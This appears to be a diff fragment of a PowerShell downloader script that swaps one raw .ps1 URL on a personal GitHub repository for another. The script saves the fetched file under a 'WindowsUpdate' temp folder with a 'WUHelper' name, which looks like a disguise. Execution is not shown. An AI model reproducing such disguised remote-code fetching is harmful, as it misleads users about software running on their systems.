@@ -1460,7 +1460,7 @@ $ErrorActionPreference = 'Stop'
 $destDir = "C:\Windows\Temp\WindowsUpdate"
 $scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1" 
 $scriptPath = Join-Path -Path $destDir -ChildPath $scriptName
-$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"
+$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/personalization.ps1"
 $logFile = Join-Path -Path $destDir -ChildPath "Downloader_$(Get-Date -Format 'yyyyMMdd').log"
 function Write-Log {
     param (
